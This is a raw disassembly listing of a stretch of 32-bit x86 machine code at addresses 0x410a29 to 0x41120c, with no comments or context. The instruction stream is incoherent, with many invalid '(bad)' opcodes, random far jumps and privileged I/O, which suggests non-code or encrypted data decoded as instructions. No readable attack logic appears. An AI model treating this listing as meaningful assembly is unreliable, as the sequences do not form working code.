  410a29:	jo     0x4109d2
  410a2b:	mov    dl,0x20
  410a2d:	xor    ah,BYTE PTR [eax+0x71]
  410a30:	pop    eax
  410a31:	ins    DWORD PTR es:[edi],dx
  410a32:	cmp    BYTE PTR [ebx],al
  410a34:	into   
  410a35:	sub    eax,0x87a13cf
  410a3a:	inc    esi
  410a3b:	add    BYTE PTR [esi-0x6b],bh
  410a3e:	adc    eax,0x1db34444
  410a43:	inc    ebx
  410a44:	fs (bad) 
  410a46:	dec    ebx
  410a47:	mov    ah,0x16
  410a49:	pop    es
  410a4a:	jb     0x410a8a
  410a4c:	int    0x28
  410a4e:	imul   esp,edi,0x31
  410a51:	popa   
  410a52:	mov    WORD PTR ss:[ecx],?
  410a55:	js     0x410a4f
  410a57:	ins    DWORD PTR es:[edi],dx
  410a58:	pop    ebx
  410a59:	std    
  410a5a:	ror    DWORD PTR [eax+edi*1+0x7ca3b475],0x74
  410a62:	dec    ebp
  410a63:	and    ch,bl
  410a65:	pop    ebp
  410a66:	stc    
  410a67:	jb     0x410a29
  410a69:	rol    BYTE PTR [edi],1
  410a6b:	push   cs
  410a6c:	inc    ebx
  410a6d:	sub    eax,0x8cb3b967
  410a72:	add    al,0xe0
  410a74:	ins    BYTE PTR es:[edi],dx
  410a75:	push   eax
  410a76:	cwde   
  410a77:	add    esi,DWORD PTR [ebp+esi*8+0x14]
  410a7b:	data16 mov cs,WORD PTR [ecx+0x3669d67c]
  410a82:	sub    esi,DWORD PTR [ebx-0x30352674]
  410a88:	jns    0x410a4f
  410a8a:	lea    ebx,[eax+edi*4]
  410a8d:	clc    
  410a8e:	or     bh,al
  410a90:	sbb    ch,0x3b
  410a93:	retf   0xfdf
  410a96:	cmp    DWORD PTR [edi+0x791c18d4],edi
  410a9c:	jl     0x410add
  410a9e:	dec    ebx
  410a9f:	repz and edx,ebx
  410aa2:	stc    
  410aa3:	popf   
  410aa4:	and    DWORD PTR [edx+0x1b2c4310],ebx
  410aaa:	jmp    0x410a7c
  410aac:	dec    esp
  410aad:	sub    eax,0xf337002b
  410ab2:	int3   
  410ab3:	fild   QWORD PTR [ebp-0x28]
  410ab6:	test   al,0xed
  410ab8:	add    BYTE PTR [ebx+0x51],ah
  410abb:	aad    0x76
  410abd:	retf   0x96c8
  410ac0:	mov    ebx,0x4d365797
  410ac5:	stos   DWORD PTR es:[edi],eax
  410ac6:	mov    edi,0xb8b2bb13
  410acb:	sbb    dh,BYTE PTR [edi-0x2d9d8503]
  410ad1:	jge    0x410ace
  410ad3:	stc    
  410ad4:	push   edi
  410ad5:	and    edi,DWORD PTR [edx-0x3e]
  410ad8:	fwait
  410ad9:	dec    eax
  410ada:	out    dx,al
  410adb:	sahf   
  410adc:	gs sti 
  410ade:	arpl   bx,bx
  410ae0:	rol    DWORD PTR [ebp+0x6d3d0e8b],1
  410ae6:	aas    
  410ae7:	(bad)  
  410ae8:	dec    esi
  410ae9:	lea    esi,[ecx+0x7f]
  410aec:	mov    ah,0xab
  410aee:	sar    DWORD PTR [ebx],0x5f
  410af1:	pushf  
  410af2:	jb     0x410a99
  410af4:	mov    ds:0x98d83ce8,eax
  410af9:	dec    ebp
  410afa:	test   eax,0xccd620b9
  410aff:	xchg   esi,eax
  410b00:	mov    eax,ds:0x6b7da6d9
  410b05:	mov    bh,0x60
  410b07:	mov    dl,0xb4
  410b09:	and    esp,esi
  410b0b:	jp     0x410b27
  410b0d:	loope  0x410a95
  410b0f:	in     eax,0x5a
  410b11:	xor    bh,BYTE PTR ds:0x4070c3ec
  410b17:	imul   ebp,DWORD PTR [ebp+0x2a],0x3808b235
  410b1e:	xor    al,0xad
  410b20:	dec    eax
  410b21:	(bad)  
  410b22:	aaa    
  410b23:	call   0x2305a8ac
  410b28:	mov    ecx,0x8ce64f22
  410b2d:	sar    BYTE PTR [edx],0xbf
  410b30:	and    al,ch
  410b32:	dec    esi
  410b33:	dec    edx
  410b34:	out    dx,eax
  410b35:	push   0xfffffff8
  410b37:	pop    ebp
  410b38:	aad    0x88
  410b3a:	iret   
  410b3b:	clc    
  410b3c:	pop    es
  410b3d:	add    eax,0xf0f2ad03
  410b42:	aas    
  410b43:	fst    QWORD PTR [eax+0x3591bcd7]
  410b49:	jne    0x410bb2
  410b4b:	push   eax
  410b4c:	outs   dx,BYTE PTR ds:[esi]
  410b4d:	into   
  410b4e:	add    eax,0x638b26e
  410b53:	shr    BYTE PTR [esi-0x6dce9251],cl
  410b59:	dec    esi
  410b5a:	leave  
  410b5b:	mov    bh,BYTE PTR [edx-0x2acf4ef0]
  410b61:	mov    bh,0x21
  410b63:	imul   ebx,DWORD PTR [eax-0x2af65882],0x249e9168
  410b6d:	ret    0x3689
  410b70:	stos   BYTE PTR es:[edi],al
  410b71:	lds    edi,FWORD PTR [ebp-0x4]
  410b74:	in     eax,0xa1
  410b76:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b78:	add    BYTE PTR [ebx+0x1147ccd2],ah
  410b7e:	outs   dx,BYTE PTR ds:[esi]
  410b7f:	jecxz  0x410b94
  410b81:	jmp    0x9606:0xb9016980
  410b88:	push   ebx
  410b89:	repnz imul ecx,DWORD PTR [esi],0xffffffa4
  410b8d:	out    dx,eax
  410b8e:	xor    BYTE PTR [ecx+ebx*8+0x3f850195],dh
  410b95:	pusha  
  410b96:	xchg   ebp,eax
  410b97:	pop    edx
  410b98:	js     0x410bf8
  410b9a:	(bad)  
  410b9c:	add    BYTE PTR [ebx-0x3be95c3f],bh
  410ba2:	xor    DWORD PTR [edx+0x451bc7a1],esi
  410ba8:	cli    
  410ba9:	xlat   BYTE PTR ds:[ebx]
  410baa:	out    0x10,ax
  410bad:	or     ch,al
  410baf:	ins    BYTE PTR es:[edi],dx
  410bb0:	(bad)  
  410bb1:	push   0xc
  410bb3:	cmp    bh,BYTE PTR [edi]
  410bb5:	icebp  
  410bb6:	jge    0x410c0b
  410bb8:	in     al,dx
  410bb9:	or     BYTE PTR [eax],cl
  410bbb:	mov    esp,0xc6b36b5e
  410bc0:	fadd   DWORD PTR [edx]
  410bc2:	fisub  WORD PTR [ecx]
  410bc4:	sahf   
  410bc5:	sbb    DWORD PTR [eax],edx
  410bc7:	enter  0x536a,0xac
  410bcb:	dec    eax
  410bcc:	inc    dx
  410bce:	jle    0x410c46
  410bd0:	sbb    al,0x54
  410bd2:	push   ebp
  410bd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bd4:	cmovg  edi,DWORD PTR [edi+0x5e]
  410bd8:	sub    al,0x5b
  410bda:	push   ss
  410bdb:	add    al,0xd7
  410bdd:	dec    esp
  410bde:	imul   ebx,DWORD PTR ds:0xef129848,0xc5339e57
  410be8:	hlt    
  410be9:	pusha  
  410bea:	jl     0x410ba1
  410bec:	retf   
  410bed:	xchg   BYTE PTR [edi-0x1bc74781],ah
  410bf3:	or     eax,0x50ce68f4
  410bf8:	mov    cl,0xb9
  410bfa:	loopne 0x410b81
  410bfc:	repnz cmp eax,DWORD PTR [ecx]
  410bff:	jb     0x410c35
  410c01:	xchg   DWORD PTR [ebp+edx*1-0x52cbbbf8],eax
  410c08:	mov    ds:0x52595297,eax
  410c0d:	add    ebp,eax
  410c0f:	sub    al,0x89
  410c11:	cmp    ebx,ebp
  410c13:	fs add al,0x23
  410c16:	int3   
  410c17:	lock inc ebx
  410c19:	mov    edx,ebp
  410c1b:	cmp    edx,DWORD PTR [edi]
  410c1d:	add    ebp,DWORD PTR [ebp-0xa]
  410c20:	inc    edi
  410c21:	pop    ss
  410c22:	fsub   QWORD PTR [edi]
  410c24:	test   eax,0x1c71fc65
  410c29:	jg     0x410bb2
  410c2b:	cli    
  410c2c:	mov    edi,0x90235dfd
  410c31:	pop    ebx
  410c32:	int    0xc5
  410c34:	mov    ebp,0x58d507e
  410c39:	jmp    0xc7c:0xe70a88a3
  410c40:	fwait
  410c41:	adc    DWORD PTR [edi-0x1],0x6a
  410c45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c46:	or     eax,0x5821d77c
  410c4b:	adc    al,0x3c
  410c4d:	cmp    edx,edi
  410c4f:	push   ebx
  410c50:	jp     0x410c15
  410c52:	pop    ebp
  410c53:	les    edi,FWORD PTR ds:0x499e56fa
  410c59:	jmp    0x410cad
  410c5b:	lods   al,BYTE PTR ds:[esi]
  410c5c:	jb     0x410cbd
  410c5e:	out    0xd0,al
  410c60:	sti    
  410c61:	addr16 push edx
  410c63:	pushf  
  410c64:	daa    
  410c65:	adc    BYTE PTR [ebx],dl
  410c67:	inc    edx
  410c68:	xor    al,0xe9
  410c6a:	inc    esi
  410c6b:	shl    DWORD PTR ds:0x22b4e8dc,1
  410c71:	test   dl,cl
  410c73:	scas   al,BYTE PTR es:[edi]
  410c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c75:	idiv   al
  410c77:	sbb    cl,BYTE PTR [ecx+0x18c2121f]
  410c7d:	sbb    al,0xbb
  410c7f:	ficom  DWORD PTR [ecx-0x727d9832]
  410c85:	fwait
  410c86:	cmp    al,0xe8
  410c88:	mov    ecx,0xd42eafcc
  410c8d:	imul   ebp,DWORD PTR [eax],0xffffff90
  410c90:	mov    esp,0x98b1974d
  410c95:	sub    DWORD PTR [eax+0x56687192],0x18
  410c9c:	ret    0x75e2
  410c9f:	fxch   st(6)
  410ca1:	mov    bl,0x27
  410ca3:	pop    ds
  410ca4:	dec    eax
  410ca5:	sub    edx,DWORD PTR [ecx-0x65]
  410ca8:	leave  
  410ca9:	shr    BYTE PTR [edx+0x6380ef3c],cl
  410caf:	js     0x410c9f
  410cb1:	pop    edi
  410cb2:	jle    0x410d03
  410cb4:	shr    DWORD PTR [edi],0x72
  410cb7:	push   es
  410cb8:	out    0x70,al
  410cba:	push   ebx
  410cbb:	sub    BYTE PTR [edx+0x37666a9a],0xa9
  410cc2:	mov    bh,0x5c
  410cc4:	stos   DWORD PTR es:[edi],eax
  410cc5:	push   0x486898e8
  410cca:	dec    ebp
  410ccb:	inc    edx
  410ccc:	fwait
  410ccd:	ds pop ss
  410ccf:	dec    ebp
  410cd0:	pop    esp
  410cd1:	ss (bad) 
  410cd3:	sub    bh,BYTE PTR [eax+edx*2-0x755e8dd8]
  410cda:	lock popf 
  410cdc:	jle    0x410d3b
  410cde:	(bad)  
  410cdf:	lock repz mov ah,0x5c
  410ce3:	sbb    BYTE PTR [ebp+eax*8-0x7744af44],cl
  410cea:	out    0x3,al
  410cec:	shl    DWORD PTR [edx-0x7d],1
  410cef:	(bad)  
  410cf0:	imul   ecx,DWORD PTR [ebp+0x66],0xfffffff7
  410cf4:	xor    eax,0x3707735e
  410cf9:	aas    
  410cfa:	mov    dh,0xe3
  410cfc:	mov    ss,WORD PTR [eax-0x3d]
  410cff:	xor    BYTE PTR [edx],bl
  410d01:	iret   
  410d02:	adc    BYTE PTR [edx+0x2b498a21],ch
  410d08:	das    
  410d09:	adc    BYTE PTR ds:0xebf7723d,cl
  410d0f:	mov    esp,0x54b2ed79
  410d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d15:	cmp    cl,BYTE PTR [ebx-0x5e5186f4]
  410d1b:	adc    bl,dl
  410d1d:	cmc    
  410d1e:	popa   
  410d1f:	xchg   edx,eax
  410d20:	push   ds
  410d21:	fnstcw WORD PTR [edi]
  410d23:	jno    0x410d95
  410d25:	add    BYTE PTR [ebx+esi*2-0x75a46837],ch
  410d2c:	jmp    0xb7fa:0x6adaa1fd
  410d33:	mov    eax,0xf173a15a
  410d38:	xor    eax,0xe9ef3183
  410d3d:	sbb    edx,DWORD PTR [edx+0xb58a98e]
  410d43:	cmp    al,0x39
  410d45:	sbb    eax,0x8476665
  410d4a:	popa   
  410d4b:	ret    
  410d4c:	jmp    0x53f49ad
  410d51:	add    eax,0x47e2e446
  410d56:	outs   dx,BYTE PTR ds:[esi]
  410d57:	dec    ebx
  410d58:	xchg   ebx,eax
  410d59:	push   cs
  410d5a:	dec    edx
  410d5b:	adc    BYTE PTR [edi-0x28],0xe5
  410d5f:	pop    esp
  410d60:	fdivr  QWORD PTR [ecx-0x7d429a96]
  410d66:	ins    DWORD PTR es:[edi],dx
  410d67:	adc    BYTE PTR [ecx+0x7dff0cc7],dh
  410d6d:	iret   
  410d6e:	shr    cl,1
  410d70:	add    bl,BYTE PTR [esp+ebp*8]
  410d73:	push   ebp
  410d75:	lods   eax,DWORD PTR ds:[esi]
  410d76:	cli    
  410d77:	pop    ds
  410d78:	dec    eax
  410d79:	xchg   esi,eax
  410d7a:	sub    al,0xf8
  410d7c:	xor    eax,0x8c8fbd2
  410d81:	push   esi
  410d82:	mov    edi,0xde988d4a
  410d87:	mov    ebx,0xd66cef73
  410d8c:	lock mov esp,0xdcf0d6e7
  410d92:	push   edi
  410d93:	fimul  WORD PTR [edx-0x6eb8f5a]
  410d99:	nop
  410d9a:	ret    0x66e7
  410d9d:	adc    ebp,DWORD PTR [eax+0x83b5bfd]
  410da3:	retf   0x3d7b
  410da6:	jp     0x410da9
  410da8:	jnp    0x410da0
  410daa:	dec    esi
  410dab:	and    eax,0xccb0d469
  410db0:	icebp  
  410db1:	dec    edi
  410db2:	iret   
  410db3:	iret   
  410db4:	(bad)  
  410db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410db6:	jl     0x410da9
  410db8:	inc    BYTE PTR [edx+eax*1-0x29]
  410dbc:	(bad)  
  410dbd:	jns    0xfea4a4f
  410dc3:	and    BYTE PTR [ebx+edi*2],bl
  410dc6:	or     edi,ebp
  410dc8:	cmp    al,BYTE PTR [esi]
  410dca:	sahf   
  410dcb:	call   0xe07bfc55
  410dd0:	mov    edx,DWORD PTR [edx+0x37]
  410dd3:	ss dec edx
  410dd5:	outs   dx,BYTE PTR ds:[esi]
  410dd6:	push   ss
  410dd7:	outs   dx,DWORD PTR ds:[esi]
  410dd8:	stc    
  410dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dda:	mov    bl,BYTE PTR [edi-0x64]
  410ddd:	arpl   WORD PTR [esi-0xc789c98],bx
  410de3:	aaa    
  410de4:	sbb    al,0xc0
  410de6:	or     ebx,DWORD PTR [eax]
  410de8:	mov    edi,0x637215a9
  410ded:	jno    0x410df8
  410def:	rol    edi,0x7a
  410df2:	xor    BYTE PTR [edx-0x7f48060c],bl
  410df8:	rcl    BYTE PTR [ebx-0xbba9787],0xa1
  410dff:	ds mov ch,0x61
  410e02:	mov    esp,ss
  410e04:	mov    WORD PTR [edx+0x3b],ds
  410e07:	dec    edx
  410e08:	dec    ecx
  410e09:	mov    esi,0xb99e7ae9
  410e0e:	shl    BYTE PTR [ecx],1
  410e10:	fisub  WORD PTR [edx-0x516c34f8]
  410e16:	dec    eax
  410e17:	out    dx,eax
  410e18:	inc    BYTE PTR ds:0xa4bf5c30
  410e1e:	jmp    0x8d54:0x14cf9aab
  410e25:	gs dec edi
  410e27:	lods   al,BYTE PTR ds:[esi]
  410e28:	dec    edx
  410e29:	or     al,cl
  410e2b:	cmc    
  410e2c:	les    ebp,FWORD PTR [esi]
  410e2e:	jns    0x410e88
  410e30:	dec    ebx
  410e31:	add    al,0x3b
  410e33:	es mov esi,0xf1f39afd
  410e39:	push   eax
  410e3a:	(bad)  
  410e3b:	sbb    DWORD PTR [edx-0x1f65254e],esi
  410e41:	mov    eax,ds:0x2921933b
  410e46:	(bad)  
  410e47:	cmp    bh,dl
  410e49:	lods   al,BYTE PTR ds:[esi]
  410e4a:	xor    eax,0x8ff07d69
  410e4f:	pushf  
  410e50:	call   0xf68eb6d3
  410e55:	loope  0x410e1e
  410e57:	pop    ebp
  410e58:	mov    ah,0xc3
  410e5a:	out    dx,eax
  410e5b:	test   DWORD PTR [ebx+0x5ef3293],edi
  410e61:	inc    ecx
  410e62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e63:	mov    ch,0xb
  410e65:	xchg   ebx,eax
  410e66:	sar    ecx,0xa5
  410e69:	cmp    BYTE PTR [ecx],al
  410e6b:	xor    al,0x45
  410e6d:	sbb    BYTE PTR [esi*8-0x164e7ec4],ch
  410e74:	inc    ebp
  410e75:	jae    0x410eee
  410e77:	hlt    
  410e78:	mov    ebx,0x655e697a
  410e7d:	inc    eax
  410e7e:	mov    WORD PTR es:[ebx],fs
  410e81:	retf   
  410e82:	sbb    ebp,esp
  410e84:	add    al,ah
  410e86:	int3   
  410e87:	popf   
  410e88:	add    eax,0xdcf4ac1f
  410e8d:	out    dx,eax
  410e8e:	ficomp DWORD PTR [ecx-0x2f0a124d]
  410e94:	mov    eax,ds:0x1cf512a2
  410e99:	push   esi
  410e9a:	push   edx
  410e9b:	dec    ebp
  410e9c:	inc    di
  410e9e:	inc    BYTE PTR [ecx+0x8e4e657]
  410ea4:	push   esp
  410ea5:	(bad)  
  410ea6:	gs cmp eax,0x57cb3058
  410eac:	data16 add cl,BYTE PTR [esi]
  410eaf:	(bad)  
  410eb0:	jl     0x410ed7
  410eb2:	sbb    eax,0x9f2d88dc
  410eb7:	icebp  
  410eb8:	sbb    al,BYTE PTR [ebp-0x26]
  410ebb:	in     al,0x36
  410ebd:	out    dx,eax
  410ebe:	clc    
  410ebf:	jo     0x410f21
  410ec1:	cmp    ch,bl
  410ec3:	add    DWORD PTR [edi-0x6f097347],ecx
  410ec9:	adc    BYTE PTR ds:0xa555e123,0x24
  410ed0:	cmp    al,0x26
  410ed2:	stos   DWORD PTR es:[edi],eax
  410ed3:	mov    ch,0xb0
  410ed5:	mov    ecx,0xafe8b2e1
  410eda:	sar    esi,0x7b
  410edd:	pop    esp
  410ede:	mov    ecx,DWORD PTR [ebx]
  410ee0:	pushf  
  410ee1:	ds xchg edi,eax
  410ee3:	push   es
  410ee4:	lods   eax,DWORD PTR ds:[esi]
  410ee5:	call   0x79b5c8be
  410eea:	fsubr  st(1),st
  410eec:	cmp    ecx,DWORD PTR [esi+0x36b40ac7]
  410ef2:	sar    BYTE PTR [ecx-0x65],1
  410ef5:	std    
  410ef6:	mov    ebp,0xb76f591e
  410efb:	out    dx,eax
  410efc:	or     dh,ah
  410efe:	xor    eax,edx
  410f00:	bound  esp,QWORD PTR [esi-0x7d66b332]
  410f06:	mov    esi,0x909e3586
  410f0b:	es dec edi
  410f0d:	xchg   DWORD PTR [edi],esp
  410f0f:	int3   
  410f10:	cmp    BYTE PTR [edx-0x73],dh
  410f13:	dec    eax
  410f14:	lods   al,BYTE PTR ds:[esi]
  410f15:	pop    esp
  410f16:	push   0x464f83d9
  410f1b:	and    eax,0xbda2b776
  410f20:	pop    DWORD PTR [eax-0x4b]
  410f23:	inc    esi
  410f24:	adc    ecx,DWORD PTR [edx+0x7e49afaf]
  410f2a:	int3   
  410f2b:	dec    esi
  410f2c:	mov    BYTE PTR [ebp-0xc1c47b5],ch
  410f32:	xchg   ebp,eax
  410f33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f34:	fsubrp st(1),st
  410f36:	popa   
  410f37:	bound  ebx,QWORD PTR [edx-0x5cd0d947]
  410f3d:	jb     0x410f45
  410f3f:	mov    dl,0xf0
  410f41:	mov    cl,0x92
  410f43:	addr16 nop
  410f45:	mov    ebp,ss
  410f47:	enter  0x3713,0x86
  410f4b:	dec    esi
  410f4c:	mov    al,ds:0xd1832b37
  410f51:	mov    ebx,gs
  410f53:	pusha  
  410f54:	jmp    0x2019:0xf2759a20
  410f5b:	jecxz  0x410f9f
  410f5d:	jbe    0x410f5d
  410f5f:	stos   DWORD PTR es:[edi],eax
  410f60:	ja     0x410f52
  410f62:	jbe    0x410f8e
  410f64:	enter  0xe92b,0x9e
  410f68:	dec    ebx
  410f69:	jge    0x410fc5
  410f6b:	imul   esi,DWORD PTR [ecx],0x17cd9d03
  410f71:	jp     0x410ef4
  410f73:	pop    ebx
  410f74:	mov    bh,0xeb
  410f76:	stos   DWORD PTR es:[edi],eax
  410f77:	call   0xf1dcf78
  410f7c:	ficom  DWORD PTR [eax-0x40]
  410f7f:	loope  0x410f9b
  410f81:	test   al,0x5d
  410f83:	jo     0x410fb7
  410f85:	mov    ch,BYTE PTR [edx-0x5adc585e]
  410f8b:	or     al,BYTE PTR [ebx]
  410f8d:	mov    edx,0xd63744a5
  410f92:	sahf   
  410f93:	cmp    edi,DWORD PTR ds:0xfecc838b
  410f99:	sbb    DWORD PTR ds:0xc83c1474,0xffffffec
  410fa0:	pop    esi
  410fa1:	lahf   
  410fa2:	xchg   ecx,eax
  410fa3:	cmp    ebx,DWORD PTR [ebx]
  410fa5:	and    BYTE PTR [esp+esi*1],dh
  410fa8:	mov    al,ds:0x9c333768
  410fad:	mov    eax,ds:0xc63c14f2
  410fb2:	or     DWORD PTR [ecx+0x7e],esi
  410fb5:	icebp  
  410fb6:	fcmovu st,st(3)
  410fb8:	inc    edx
  410fb9:	cli    
  410fba:	arpl   WORD PTR [edx],bx
  410fbc:	mov    ch,0x7f
  410fbe:	sti    
  410fbf:	hlt    
  410fc0:	pop    edx
  410fc1:	adc    BYTE PTR [esp+ecx*4-0x36],ch
  410fc5:	push   cs
  410fc6:	jnp    0x411013
  410fc8:	inc    esi
  410fc9:	cmp    al,0xb9
  410fcb:	push   edi
  410fcc:	sbb    bl,dl
  410fce:	mov    cl,0xaa
  410fd0:	ret    0x427b
  410fd3:	loope  0x411054
  410fd5:	(bad)  
  410fd6:	xlat   BYTE PTR ds:[ebx]
  410fd7:	out    0x96,al
  410fd9:	in     eax,dx
  410fda:	arpl   WORD PTR [eax-0x66],dx
  410fdd:	add    DWORD PTR [edx+eax*4-0x701196cf],esp
  410fe4:	enter  0xc797,0xca
  410fe8:	cdq    
  410fe9:	sbb    DWORD PTR [eax+0x3c],ebx
  410fec:	or     eax,0xdb948af1
  410ff1:	out    0x3c,al
  410ff3:	mov    dl,0xc4
  410ff5:	add    bl,0x6f
  410ff8:	outs   dx,DWORD PTR ds:[esi]
  410ff9:	js     0x410fc0
  410ffb:	in     eax,dx
  410ffc:	call   ecx
  410ffe:	pop    ss
  410fff:	cdq    
  411000:	dec    edx
  411001:	cmp    al,BYTE PTR [edi+0x14a960ee]
  411007:	push   ebx
  411008:	cmp    BYTE PTR [esi-0x8e41230],dl
  41100e:	dec    ebp
  41100f:	cmp    dl,BYTE PTR [ebx+0x63bc88ba]
  411015:	inc    esp
  411016:	loope  0x41103e
  411018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411019:	jo     0x411095
  41101b:	jmp    0x411079
  41101d:	mov    ch,0x30
  41101f:	mov    ah,0x74
  411021:	or     DWORD PTR [ebp+0x4a],0x7d771166
  411028:	inc    eax
  411029:	push   ebx
  41102a:	cmp    BYTE PTR [edx],al
  41102c:	jmp    0xf8cc:0xf5e2cd03
  411033:	cmp    eax,0x27adc3e8
  411038:	mov    WORD PTR [edi-0x2a],ss
  41103b:	out    dx,eax
  41103c:	dec    edi
  41103d:	jecxz  0x4110a3
  41103f:	push   esi
  411040:	push   ds
  411041:	popa   
  411042:	mov    ecx,0x95447d0e
  411047:	xor    al,0x23
  411049:	sbb    eax,ebx
  41104b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41104c:	mov    ecx,0x267ea473
  411051:	xchg   edx,eax
  411052:	adc    BYTE PTR [edx+0x1ef1bc64],0x3c
  411059:	sub    DWORD PTR [eax],eax
  41105b:	bnd jle 0x4110c0
  41105e:	ret    0xc69d
  411061:	mov    ds:0xf9ae7b0f,al
  411066:	fstp   TBYTE PTR [edx+0x63]
  411069:	enter  0xacd6,0x6c
  41106d:	push   ebx
  41106e:	xchg   edx,eax
  41106f:	bound  edx,QWORD PTR [eax+0x45132315]
  411075:	xchg   BYTE PTR [ecx],bl
  411077:	in     al,dx
  411078:	adc    BYTE PTR [ebx],ch
  41107a:	mov    BYTE PTR [eax+0x7a17a561],dh
  411080:	push   0x45ebe058
  411085:	ds xchg ecx,eax
  411087:	sbb    BYTE PTR [ecx+0x5],bl
  41108a:	xchg   edi,eax
  41108b:	mov    di,0x28eb
  41108f:	xchg   edx,eax
  411090:	jmp    0x4a8c:0xce0005e8
  411097:	cld    
  411098:	xchg   ecx,eax
  411099:	jmp    0x41107d
  41109b:	in     al,dx
  41109c:	dec    eax
  41109d:	mov    eax,ds:0x1eeda841
  4110a2:	inc    ecx
  4110a3:	repz arpl WORD PTR [esi+ebp*4-0x3f],dx
  4110a8:	dec    edi
  4110a9:	std    
  4110aa:	popf   
  4110ab:	add    DWORD PTR [edx-0x16df98d5],ecx
  4110b1:	mov    es,WORD PTR [esi+0x73]
  4110b4:	(bad)  
  4110b5:	les    ebx,FWORD PTR [eax]
  4110b7:	xchg   edx,eax
  4110b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110b9:	mov    ?,WORD PTR [esi]
  4110bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110bc:	js     0x41109c
  4110be:	adc    ebp,edi
  4110c0:	test   DWORD PTR [ebp-0x408fda15],ebp
  4110c6:	cmp    BYTE PTR [eax-0x73],ch
  4110c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110ca:	aam    0x68
  4110cc:	fild   DWORD PTR [ecx+edi*2-0x7d87096b]
  4110d3:	xor    BYTE PTR [ebp+0x38],al
  4110d6:	cdq    
  4110d7:	adc    BYTE PTR [esi-0x49],ch
  4110da:	mov    ds:0xfe977896,al
  4110df:	mov    ebx,0x58feba1c
  4110e4:	repnz cmp ebp,DWORD PTR [edi-0x22]
  4110e8:	cmc    
  4110e9:	adc    bl,BYTE PTR [edi+0x7323b9bb]
  4110ef:	loopne 0x411153
  4110f1:	add    al,BYTE PTR [edx]
  4110f3:	popf   
  4110f4:	cmc    
  4110f5:	addr16 mov ebx,0xbb9d9803
  4110fb:	not    BYTE PTR [edi-0x4157cc0e]
  411101:	mov    ah,0x63
  411103:	push   ecx
  411104:	(bad)
  411107:	stc    
  411108:	pop    esi
  411109:	ret    0x30d9
  41110c:	and    dh,BYTE PTR [eax-0x76]
  41110f:	xchg   ebp,eax
  411110:	repz mov eax,0xf4728177
  411116:	dec    edi
  411117:	pop    ss
  411118:	ins    BYTE PTR es:[edi],dx
  411119:	add    esp,ecx
  41111b:	add    ch,cl
  41111d:	retf   0xbf74
  411120:	inc    eax
  411121:	(bad)  
  411123:	inc    eax
  411124:	(bad)  
  411125:	icebp  
  411126:	lds    ebp,FWORD PTR [ecx+0x12]
  411129:	adc    al,0x18
  41112b:	mov    ah,0xe4
  41112d:	xchg   eax,ebx
  41112f:	pusha  
  411130:	mov    dl,BYTE PTR [edx]
  411132:	arpl   WORD PTR [edi+0x5abcfb9f],si
  411138:	in     eax,dx
  411139:	xchg   DWORD PTR [ebp+0x7bb544bd],edi
  41113f:	pop    ds
  411140:	mov    edi,0xdcae2af9
  411145:	std    
  411146:	ja     0x4111a9
  411148:	jle    0x4110e4
  41114a:	out    0xb7,eax
  41114c:	cmp    edx,DWORD PTR ss:0x326611ea
  411153:	sbb    BYTE PTR [edx-0x5784ac9f],dl
  411159:	ret    
  41115a:	loopne 0x4110e4
  41115c:	fsubr  QWORD PTR [ecx+eiz*1+0x4480a3a]
  411163:	sub    BYTE PTR [edx],al
  411165:	pop    esp
  411166:	les    eax,FWORD PTR [ebx-0x77]
  411169:	aaa    
  41116a:	mov    ecx,0xb9b5bfc5
  41116f:	sbb    ebp,ebx
  411171:	mov    ebx,0x55082ae4
  411176:	pushfw 
  411178:	mov    al,0x76
  41117a:	bound  edx,QWORD PTR [ecx]
  41117c:	xchg   edx,eax
  41117d:	mov    esp,0xff5f11f1
  411182:	pusha  
  411183:	inc    esp
  411184:	fimul  WORD PTR [ebx-0x41]
  411187:	jmp    0xa67b:0x5f7aa110
  41118e:	mov    ebx,0xda521e60
  411193:	stos   BYTE PTR es:[edi],al
  411194:	in     eax,0xe4
  411196:	pop    edi
  411197:	je     0x411175
  411199:	sub    DWORD PTR [ebp+0x5],0x81d28ebe
  4111a0:	arpl   WORD PTR [ebx+0x5d08f5c7],di
  4111a6:	dec    eax
  4111a7:	xor    eax,0x1950c881
  4111ac:	pop    ecx
  4111ad:	mov    WORD PTR [ebp+0x606f285c],fs
  4111b3:	mov    ch,0xe0
  4111b5:	adc    eax,esp
  4111b7:	sbb    eax,DWORD PTR [edi+ebx*2+0x75]
  4111bb:	sahf   
  4111bc:	frstor [esi+0x5d]
  4111bf:	lds    ebx,FWORD PTR [ebp-0x52c89f34]
  4111c5:	and    ecx,edx
  4111c7:	and    bl,dl
  4111c9:	fldcw  WORD PTR [edi-0x2c]
  4111cc:	(bad)  
  4111cd:	ins    BYTE PTR es:[edi],dx
  4111ce:	mov    ds:0x5d3d8072,eax
  4111d3:	lahf   
  4111d4:	sub    bl,BYTE PTR [ebp+0x17]
  4111d7:	outs   dx,DWORD PTR ds:[esi]
  4111d8:	jmp    0x6ef3fe0b
  4111dd:	dec    ecx
  4111de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111df:	adc    dh,BYTE PTR [ecx+0x7e]
  4111e2:	dec    edi
  4111e3:	mov    eax,0x38560685
  4111e8:	sub    DWORD PTR [esi+0x3165eff4],edx
  4111ee:	(bad)  
  4111ef:	cmp    ch,BYTE PTR [eax+0x43afc262]
  4111f5:	and    DWORD PTR [edi],esp
  4111f7:	mov    esp,0x16e66609
  4111fc:	jae    0x41118b
  4111fe:	xor    DWORD PTR [esi],ebx
  411200:	inc    eax
  411201:	shl    esi,1
  411203:	shl    BYTE PTR [eax+0x65],0x6f
  411207:	dec    edx
  411208:	inc    ebx
  411209:	jne    0x4111f2
  41120b:	push   es
  41120c:	adc    ecx,ebx
